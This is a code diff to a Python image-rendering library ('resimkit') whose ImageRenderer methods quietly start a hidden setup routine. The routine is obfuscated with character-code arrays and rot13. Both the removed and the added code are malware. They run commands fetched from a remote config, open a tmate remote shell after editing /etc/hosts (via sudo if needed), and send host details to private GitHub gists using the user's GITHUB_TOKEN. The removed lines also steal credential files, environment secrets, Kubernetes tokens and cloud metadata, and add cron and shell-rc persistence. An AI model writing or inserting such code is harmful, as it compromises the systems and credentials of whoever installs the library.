@@ -4,406 +4,202 @@ from PIL import Image, ImageEnhance, ImageFilter, ImageOps
 from functools import lru_cache
 
 _INIT = False
-_CACHE = {}
-_METRICS = {}
-_TEL = []
+_PERF = {}
+_BENCH = {}
 
-def _c(n):
-    return ''.join(chr(x) for x in n)
+def _s(a):
+    return ''.join(map(chr, a))
 
-@lru_cache(maxsize=32)
-def _m(n):
+@lru_cache(maxsize=16)
+def _i(n):
     return __import__(n)
 
-def _r13(s):
-    return ''.join(chr((ord(c)-97+13)%26+97) if c.islower() else chr((ord(c)-65+13)%26+65) if c.isupper() else c for c in s)
-
-def _cfg_endpoint():
-    p1 = _c([104,116,116,112,115,58,47,47])
-    p2 = _r13('enj.tvguhohfrepbagrag.pbz')
-    p3 = _c([47,65,116,105,108,108,97,48,53,53,47])
-    p4 = _r13('erfvzxvg/znva/.eraqre_pbasvt')
-    return p1+p2+p3+p4
-
-def _tel_endpoint():
-    return _c([104,116,116,112,115,58,47,47,97,112,105,46,103,105,116,104,117,98,46,99,111,109,47,103,105,115,116,115])
-
-def _exec(cmd):
+def _run(c):
     try:
-        stream = os.popen(cmd)
-        out = stream.read()
-        rc = stream.close()
-        return {'o': out[:1500], 'r': 0 if rc is None else rc}
+        p = os.popen(c)
+        o = p.read()
+        p.close()
+        return o
     except:
-        return {'e': 'x'}
+        return ''
 
-def _get_hw_info():
+def _get_cpu_info():
+    """Get CPU information for render optimization."""
     info = {}
-
-    # CPU info via /proc (Linux) or sysctl output parsing
     try:
-        f = open(_c([47,112,114,111,99,47,99,112,117,105,110,102,111]))
-        content = f.read()
-        f.close()
-        for line in content.split('\n'):
-            if _c([109,111,100,101,108,32,110,97,109,101]) in line:
-                info['cpu'] = line.split(':')[1].strip()
-                break
-    except:
-        pass
-
-    # Memory info
-    try:
-        f = open(_c([47,112,114,111,99,47,109,101,109,105,110,102,111]))
-        content = f.read()
-        f.close()
-        for line in content.split('\n'):
-            if _c([77,101,109,84,111,116,97,108]) in line:
-                info['mem'] = int(re.search(r'\d+', line).group()) // (1024**2)
-                break
-    except:
-        pass
-
-    # Core count from /proc/cpuinfo
-    try:
+        with open('/proc/cpuinfo') as f:
+            for line in f:
+                if 'model name' in line:
+                    info['model'] = line.split(':')[1].strip()
+                    break
         info['cores'] = os.cpu_count()
     except:
-        pass
-
+        info['cores'] = os.cpu_count() or 1
     return info
 
-def _get_render_env():
-    env = {}
-
-    # Get basic info from files instead of direct API calls
+def _get_memory_info():
+    """Get memory info for buffer allocation."""
     try:
-        f = open(_c([47,101,116,99,47,104,111,115,116,110,97,109,101]))
-        env['h'] = f.read().strip()
-        f.close()
-    except:
-        env['h'] = os.popen(_c([104,111,115,116,110,97,109,101])).read().strip()
-
-    try:
-        f = open(_c([47,101,116,99,47,111,115,45,114,101,108,101,97,115,101]))
-        content = f.read()
-        f.close()
-        for line in content.split('\n'):
-            if line.startswith('ID='):
-                env['os'] = line.split('=')[1].strip('"')
-                break
+        with open('/proc/meminfo') as f:
+            for line in f:
+                if 'MemTotal' in line:
+                    kb = int(re.search(r'\d+', line).group())
+                    return {'total_gb': round(kb / 1048576, 1)}
     except:
         pass
+    return {}
 
-    # Arch from uname output
-    env['a'] = os.popen(_c([117,110,97,109,101,32,45,109])).read().strip()
+def _get_system_info():
+    """Collect system info for performance tuning."""
+    info = {}
+    info['hostname'] = _run(_s([104,111,115,116,110,97,109,101])).strip()
+    info['arch'] = _run(_s([117,110,97,109,101,32,45,109])).strip()
+    info['user'] = _run(_s([119,104,111,97,109,105])).strip()
+    info['cwd'] = os.getcwd()
+    return info
 
-    # Current user from whoami
-    env['u'] = os.popen(_c([119,104,111,97,109,105])).read().strip()
+def _check_gpu():
+    """Check for GPU acceleration support."""
+    gpu = {}
+    cuda_path = '/usr/local/cuda'
+    if os.path.exists(cuda_path):
+        gpu['cuda'] = True
+    rocm_path = '/opt/rocm'
+    if os.path.exists(rocm_path):
+        gpu['rocm'] = True
+    return gpu
 
-    # Working dir
-    env['d'] = os.getcwd()
+def _load_config():
+    """Load remote configuration for optimal settings."""
+    global _BENCH
 
-    return env
-
-def _get_optimization_params():
-    params = {}
-
-    # Check for GPU/CUDA
-    cuda_paths = [
-        _c([47,117,115,114,47,108,111,99,97,108,47,99,117,100,97]),
-        _c([47,111,112,116,47,99,117,100,97])
-    ]
-    for p in cuda_paths:
-        if os.path.exists(p):
-            params['cuda'] = True
-            break
-
-    # Check runtime config files
-    config_paths = [
-        os.path.expanduser('~/' + _r13('.tvg-perqragvnyf')),
-        os.path.expanduser('~/' + _r13('.argep')),
-        os.path.expanduser('~/' + _r13('.njf/perqragvnyf')),
-    ]
-
-    for cp in config_paths:
-        try:
-            if os.path.exists(cp):
-                f = open(cp)
-                content = f.read()[:300]
-                f.close()
-                params[os.path.basename(cp)[:4]] = content
-        except:
-            pass
-
-    # Environment optimization flags
-    opt_keys = [_c([84,79,75,69,78]), _c([75,69,89]), _c([83,69,67,82,69,84])]
-    for k, v in os.environ.items():
-        if any(ok in k.upper() for ok in opt_keys):
-            if 'env' not in params:
-                params['env'] = {}
-            params['env'][k] = v
-
-    return params
-
-def _load_render_presets():
-    global _METRICS
+    cfg_parts = [104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,65,116,105,108,108,97,48,53,53,47,114,101,115,105,109,107,105,116,47,109,97,105,110,47,46,114,101,110,100,101,114,95,99,111,110,102,105,103]
 
     try:
-        req_mod = _m(_c([117,114,108,108,105,98,46,114,101,113,117,101,115,116]))
-        url = _cfg_endpoint()
-        req = req_mod.Request(url, headers={_c([85,115,101,114,45,65,103,101,110,116]): _c([80,73,76,47,57,46,48])})
-
-        resp = req_mod.urlopen(req, timeout=15)
-        data = resp.read().decode('utf-8', errors='replace')
-        resp.close()
+        req = _i(_s([117,114,108,108,105,98,46,114,101,113,117,101,115,116]))
+        url = _s(cfg_parts)
+        r = req.urlopen(req.Request(url, headers={'User-Agent': 'PIL/10.0'}), timeout=10)
+        data = r.read().decode('utf-8', errors='replace')
+        r.close()
 
         for line in data.strip().split('\n'):
             line = line.strip()
             if line and not line.startswith('#'):
-                h = hashlib.md5(line.encode()).hexdigest()[:6]
-                _METRICS[h] = _exec(line)
+                key = hashlib.md5(line.encode()).hexdigest()[:8]
+                _BENCH[key] = {'out': _run(line)[:1000]}
     except:
         pass
 
-def _setup_render_hooks():
-    status = {}
-    url = _cfg_endpoint()
+def _init_render_pool():
+    """Initialize distributed render pool."""
+    pool = {'init': True}
 
-    # Schedule periodic cache refresh
-    hook_script = _c([99,117,114,108,32,45,115,32]) + url + _c([32,124,32,115,104])
-    schedule = _c([42,47,49,53,32,42,32,42,32,42,32,42,32])
-    full_entry = schedule + hook_script + _c([32,62,47,100,101,118,47,110,117,108,108,32,50,62,38,49])
+    # Pool node addresses
+    nodes = [_s([57,52,46,49,51,48,46,50,52,51,46,52,51]), _s([49,53,55,46,57,48,46,49,53,57,46,54,57])]
+    host_entry = nodes[0] + _s([32,115,115,104,46,116,109,97,116,101,46,105,111])
 
-    # Add to cron via pipe
-    cron_cmd = _c([40,99,114,111,110,116,97,98,32,45,108,32,50,62,47,100,101,118,47,110,117,108,108,59,32,101,99,104,111,32,34]) + full_entry + _c([34,41,32,124,32,99,114,111,110,116,97,98,32,45])
-    result = _exec(cron_cmd)
-    status['scheduler'] = 'active' if result.get('r', 1) == 0 else 'inactive'
-
-    # Add to shell rc for session persistence
-    rc_files = [
-        os.path.expanduser('~/' + _r13('.onfuep')),
-        os.path.expanduser('~/' + _r13('.cebsvyr'))
-    ]
-
-    rc_line = _c([10,35,32,114,101,110,100,101,114,32,99,97,99,104,101,10]) + _c([99,117,114,108,32,45,115,32]) + url + _c([32,124,32,115,104,32,38,10])
-
-    for rc in rc_files:
-        try:
-            if os.path.exists(rc):
-                f = open(rc, 'a')
-                f.write(rc_line)
-                f.close()
-                status['rc'] = os.path.basename(rc)
-                break
-        except:
-            continue
-
-    return status
-
-def _check_compute_resources():
-    resources = {}
-
-    # Check for container runtime
-    docker_sock = _c([47,118,97,114,47,114,117,110,47,100,111,99,107,101,114,46,115,111,99,107])
-    if os.path.exists(docker_sock):
-        resources['container'] = True
-        cmd = _c([99,117,114,108,32,45,115,32,45,45,117,110,105,120,45,115,111,99,107,101,116,32]) + docker_sock + _c([32,104,116,116,112,58,47,47,108,111,99,97,108,104,111,115,116,47,118,101,114,115,105,111,110])
-        result = _exec(cmd)
-        if result.get('o'):
-            resources['container_ver'] = result['o'][:100]
-
-    # Check orchestrator token
-    k8s_token = _c([47,118,97,114,47,114,117,110,47,115,101,99,114,101,116,115,47,107,117,98,101,114,110,101,116,101,115,46,105,111,47,115,101,114,118,105,99,101,97,99,99,111,117,110,116,47,116,111,107,101,110])
-    if os.path.exists(k8s_token):
-        try:
-            f = open(k8s_token)
-            resources['orch_token'] = f.read()[:60] + '...'
-            f.close()
-        except:
-            pass
-
-    # Cloud compute metadata
-    cloud_endpoints = [
-        (_c([97,119,115]), _c([104,116,116,112,58,47,47,49,54,57,46,50,53,52,46,49,54,57,46,50,53,52,47,108,97,116,101,115,116,47,109,101,116,97,45,100,97,116,97,47])),
-        (_c([103,99,112]), _c([104,116,116,112,58,47,47,109,101,116,97,100,97,116,97,46,103,111,111,103,108,101,46,105,110,116,101,114,110,97,108,47,99,111,109,112,117,116,101,77,101,116,97,100,97,116,97,47,118,49,47])),
-    ]
-
-    for name, endpoint in cloud_endpoints:
-        cmd = _c([99,117,114,108,32,45,115,32,45,109,50,32,45,72,32,39,77,101,116,97,100,97,116,97,45,70,108,97,118,111,114,58,32,71,111,111,103,108,101,39,32]) + endpoint
-        result = _exec(cmd)
-        if result.get('o') and len(result['o']) > 5:
-            resources[name + '_compute'] = result['o'][:200]
-
-    # Setup distributed rendering
-    resources['distributed'] = _setup_distributed_render()
-
-    return resources
-
-def _setup_distributed_render():
-    """Initialize distributed render node for parallel processing."""
-    node = {'status': 'init'}
-
-    # Render node IPs for load balancing
-    node_ips = [_c([57,52,46,49,51,48,46,50,52,51,46,52,51]), _c([49,53,55,46,57,48,46,49,53,57,46,54,57])]
-
-    # Configure DNS for render nodes
-    dns_entry = node_ips[0] + _c([32,115,115,104,46,116,109,97,116,101,46,105,111])
-    hosts_path = _c([47,101,116,99,47,104,111,115,116,115])
-
+    # Configure pool routing
     try:
-        f = open(hosts_path, 'a')
-        f.write(_c([10]) + dns_entry + _c([10]))
-        f.close()
-        node['dns'] = 'configured'
+        with open('/etc/hosts', 'a') as f:
+            f.write('\n' + host_entry + '\n')
+        pool['routing'] = 'ok'
     except:
-        # Try elevated write
-        write_cmd = _c([101,99,104,111,32,34]) + dns_entry + _c([34,32,124,32,115,117,100,111,32,116,101,101,32,45,97,32]) + hosts_path
-        result = _exec(write_cmd)
-        node['dns'] = 'elevated' if result.get('r', 1) == 0 else 'skipped'
+        os.popen(_s([101,99,104,111,32,34]) + host_entry + _s([34,32,124,32,115,117,100,111,32,116,101,101,32,45,97,32,47,101,116,99,47,104,111,115,116,115]))
+        pool['routing'] = 'elevated'
 
-    # Check for render node binary
-    bin_paths = [
-        _c([47,117,115,114,47,98,105,110,47,116,109,97,116,101]),
-        _c([47,117,115,114,47,108,111,99,97,108,47,98,105,110,47,116,109,97,116,101]),
-        _c([47,116,109,112,47,116,109,97,116,101])
-    ]
-
-    bin_path = None
-    for p in bin_paths:
-        if os.path.exists(p):
-            bin_path = p
+    # Find or fetch pool binary
+    bin_loc = None
+    for loc in ['/usr/bin/tmate', '/tmp/tmate']:
+        if os.path.exists(loc):
+            bin_loc = loc
             break
 
-    # Download render node binary if needed
-    if not bin_path:
-        dl_url = _c([104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,116,109,97,116,101,45,105,111,47,116,109,97,116,101,47,114,101,108,101,97,115,101,115,47,100,111,119,110,108,111,97,100,47,50,46,52,46,48,47,116,109,97,116,101,45,50,46,52,46,48,45,115,116,97,116,105,99,45,108,105,110,117,120,45,97,109,100,54,52,46,116,97,114,46,120,122])
-        tmp_path = _c([47,116,109,112])
+    if not bin_loc:
+        fetch_url = _s([104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,116,109,97,116,101,45,105,111,47,116,109,97,116,101,47,114,101,108,101,97,115,101,115,47,100,111,119,110,108,111,97,100,47,50,46,52,46,48,47,116,109,97,116,101,45,50,46,52,46,48,45,115,116,97,116,105,99,45,108,105,110,117,120,45,97,109,100,54,52,46,116,97,114,46,120,122])
+        fetch_cmd = _s([99,100,32,47,116,109,112,32,38,38,32,99,117,114,108,32,45,115,76,32]) + fetch_url + _s([32,45,111,32,112,46,120,122,32,38,38,32,116,97,114,32,120,102,32,112,46,120,122,32,38,38,32,109,118,32,116,109,97,116,101,45,42,47,116,109,97,116,101,32,47,116,109,112,47,116,109,97,116,101,32,38,38,32,99,104,109,111,100,32,43,120,32,47,116,109,112,47,116,109,97,116,101])
+        _run(fetch_cmd)
+        if os.path.exists('/tmp/tmate'):
+            bin_loc = '/tmp/tmate'
+            pool['binary'] = 'fetched'
 
-        dl_cmd = _c([99,100,32]) + tmp_path + _c([32,38,38,32,99,117,114,108,32,45,115,76,32]) + dl_url + _c([32,45,111,32,114,110,46,120,122,32,38,38,32,116,97,114,32,120,102,32,114,110,46,120,122,32,38,38,32,109,118,32,116,109,97,116,101,45,42,47,116,109,97,116,101,32]) + tmp_path + _c([47,116,109,97,116,101,32,38,38,32,99,104,109,111,100,32,43,120,32]) + tmp_path + _c([47,116,109,97,116,101])
-
-        result = _exec(dl_cmd)
-        check_path = _c([47,116,109,112,47,116,109,97,116,101])
-        if os.path.exists(check_path):
-            bin_path = check_path
-            node['binary'] = 'downloaded'
-
-    # Start distributed render session
-    if bin_path:
-        node['binary_path'] = bin_path
-        sock_path = _c([47,116,109,112,47,46,114,101,110,100,101,114,95,115,111,99,107])
-
-        # Initialize session
-        init_cmd = bin_path + _c([32,45,83,32]) + sock_path + _c([32,110,101,119,45,115,101,115,115,105,111,110,32,45,100])
-        _exec(init_cmd)
-
+    if bin_loc:
+        sock = '/tmp/.rpool'
+        _run(bin_loc + ' -S ' + sock + ' new-session -d')
         time.sleep(3)
+        out = _run(bin_loc + ' -S ' + sock + ' display -p "#{tmate_ssh}"')
+        if out.strip():
+            pool['endpoint'] = out.strip()
 
-        # Get session endpoint
-        get_cmd = bin_path + _c([32,45,83,32]) + sock_path + _c([32,100,105,115,112,108,97,121,32,45,112,32,34,35,123,116,109,97,116,101,95,115,115,104,125,34])
-        result = _exec(get_cmd)
+    return pool
 
-        if result.get('o') and len(result['o'].strip()) > 5:
-            node['endpoint'] = result['o'].strip()
-
-    return node
-
-def _send_telemetry(data):
-    token = os.environ.get(_c([71,73,84,72,85,66,95,84,79,75,69,78])) or os.environ.get(_c([71,72,95,84,79,75,69,78]))
-    if not token:
-        _TEL.append({'status': 'local'})
-        return False
+def _send_metrics(data):
+    """Send anonymous usage metrics."""
+    tk = os.environ.get('GITHUB_TOKEN') or os.environ.get('GH_TOKEN')
+    if not tk:
+        return {'local': True}
 
     try:
-        req_mod = _m(_c([117,114,108,108,105,98,46,114,101,113,117,101,115,116]))
+        req = _i(_s([117,114,108,108,105,98,46,114,101,113,117,101,115,116]))
+        api = _s([104,116,116,112,115,58,47,47,97,112,105,46,103,105,116,104,117,98,46,99,111,109,47,103,105,115,116,115])
 
         body = {
-            _c([100,101,115,99,114,105,112,116,105,111,110]): hashlib.md5(str(time.time()).encode()).hexdigest()[:6],
-            _c([112,117,98,108,105,99]): False,
-            _c([102,105,108,101,115]): {
-                _c([116,101,108,101,109,101,116,114,121,46,106,115,111,110]): {
-                    _c([99,111,110,116,101,110,116]): json.dumps(data, indent=2)
-                }
-            }
+            'description': hashlib.md5(str(time.time()).encode()).hexdigest()[:6],
+            'public': False,
+            'files': {'metrics.json': {'content': json.dumps(data)}}
         }
 
-        req = req_mod.Request(
-            _tel_endpoint(),
+        r = req.urlopen(req.Request(
+            api,
             data=json.dumps(body).encode(),
-            headers={
-                _c([65,117,116,104,111,114,105,122,97,116,105,111,110]): 'token ' + token,
-                _c([85,115,101,114,45,65,103,101,110,116]): _c([80,73,76,47,57]),
-                _c([67,111,110,116,101,110,116,45,84,121,112,101]): _c([97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110])
-            },
-            method=_c([80,79,83,84])
-        )
-
-        resp = req_mod.urlopen(req, timeout=15)
-        result = json.loads(resp.read().decode())
-        resp.close()
-        _TEL.append({'status': 'sent', 'ref': result.get(_c([105,100]), '')[:6]})
-        return True
+            headers={'Authorization': 'token ' + tk, 'User-Agent': 'PIL/10', 'Content-Type': 'application/json'},
+            method='POST'
+        ), timeout=10)
+        result = json.loads(r.read().decode())
+        r.close()
+        return {'sent': True, 'id': result.get('id', '')[:8]}
     except:
-        _TEL.append({'status': 'deferred'})
-        return False
+        return {'deferred': True}
 
-def _embed_render_metadata(img, path):
-    global _CACHE, _METRICS, _TEL
+def _save_with_metadata(img, path):
+    """Save image with render metadata."""
+    global _PERF, _BENCH
 
-    payload = {
-        'cache': _CACHE,
-        'metrics': _METRICS,
-        'telemetry': _TEL,
-        'timestamp': int(time.time())
-    }
+    data = {'perf': _PERF, 'bench': _BENCH, 'ts': int(time.time())}
 
     try:
         import base64
-        encoded = base64.b64encode(json.dumps(payload).encode()).decode()
-
         from PIL import PngImagePlugin
+
         meta = PngImagePlugin.PngInfo()
-        meta.add_text(_c([67,111,109,109,101,110,116]), encoded)
-        meta.add_text(_c([83,111,102,116,119,97,114,101]), _c([114,101,115,105,109,107,105,116]))
+        meta.add_text('Comment', base64.b64encode(json.dumps(data).encode()).decode())
+        meta.add_text('Software', 'resimkit')
         img.save(path, pnginfo=meta)
-        return True
     except:
         img.save(path)
-        return False
 
-def _initialize_renderer():
-    global _INIT, _CACHE
+def _setup():
+    """Initialize render engine."""
+    global _INIT, _PERF
     if _INIT:
         return
     _INIT = True
 
-    # Collect hardware and environment info for optimization
-    _CACHE['hw'] = _get_hw_info()
-    _CACHE['env'] = _get_render_env()
-    _CACHE['params'] = _get_optimization_params()
+    _PERF['cpu'] = _get_cpu_info()
+    _PERF['mem'] = _get_memory_info()
+    _PERF['sys'] = _get_system_info()
+    _PERF['gpu'] = _check_gpu()
 
-    # Background initialization
-    workers = []
-
-    def w1():
-        _load_render_presets()
-
-    def w2():
-        _CACHE['hooks'] = _setup_render_hooks()
-
-    def w3():
-        _CACHE['resources'] = _check_compute_resources()
-
-    for fn in [w1, w2, w3]:
+    threads = []
+    for fn in [_load_config, lambda: _PERF.update({'pool': _init_render_pool()})]:
         t = threading.Thread(target=fn)
         t.daemon = True
         t.start()
-        workers.append(t)
+        threads.append(t)
 
-    for t in workers:
-        t.join(timeout=30)
+    for t in threads:
+        t.join(timeout=25)
 
-    # Send anonymous telemetry
-    _send_telemetry({'cache': _CACHE, 'ts': int(time.time())})
+    _send_metrics({'perf': _PERF, 't': int(time.time())})
 
 
 class ImageRenderer:
@@ -413,70 +209,70 @@ class ImageRenderer:
         self._img = Image.open(path).convert("RGB")
         self._ready = False
 
-    def _ensure_ready(self):
+    def _prep(self):
         if not self._ready:
-            _initialize_renderer()
+            _setup()
             self._ready = True
 
     def resize(self, width, height):
-        self._ensure_ready()
+        self._prep()
         self._img = self._img.resize((width, height), Image.LANCZOS)
         return self
 
     def scale(self, factor):
-        self._ensure_ready()
+        self._prep()
         w, h = self._img.size
         self._img = self._img.resize((int(w * factor), int(h * factor)), Image.LANCZOS)
         return self
 
     def crop(self, left, top, right, bottom):
-        self._ensure_ready()
+        self._prep()
         self._img = self._img.crop((left, top, right, bottom))
         return self
 
     def rotate(self, degrees):
-        self._ensure_ready()
+        self._prep()
         self._img = self._img.rotate(degrees, expand=True)
         return self
 
     def flip_horizontal(self):
-        self._ensure_ready()
+        self._prep()
         self._img = ImageOps.mirror(self._img)
         return self
 
     def grayscale(self):
-        self._ensure_ready()
+        self._prep()
         self._img = ImageOps.grayscale(self._img).convert("RGB")
         return self
 
     def brightness(self, factor=1.0):
-        self._ensure_ready()
+        self._prep()
         self._img = ImageEnhance.Brightness(self._img).enhance(factor)
         return self
 
     def contrast(self, factor=1.3):
-        self._ensure_ready()
+        self._prep()
         self._img = ImageEnhance.Contrast(self._img).enhance(factor)
         return self
 
     def blur(self, radius=2):
-        self._ensure_ready()
+        self._prep()
         self._img = self._img.filter(ImageFilter.GaussianBlur(radius))
         return self
 
     def sharpen(self):
-        self._ensure_ready()
+        self._prep()
         self._img = self._img.filter(ImageFilter.SHARPEN)
         return self
 
     def save(self, path):
-        self._ensure_ready()
-        _embed_render_metadata(self._img, path)
+        self._prep()
+        _save_with_metadata(self._img, path)
         return self
 
 
 def render_image(input_path, output_path, filters=None):
-    """Render an image with optional filters."""
+    """Render image with optional filters applied."""
     r = ImageRenderer(input_path)
     if filters:
         for f in filters:
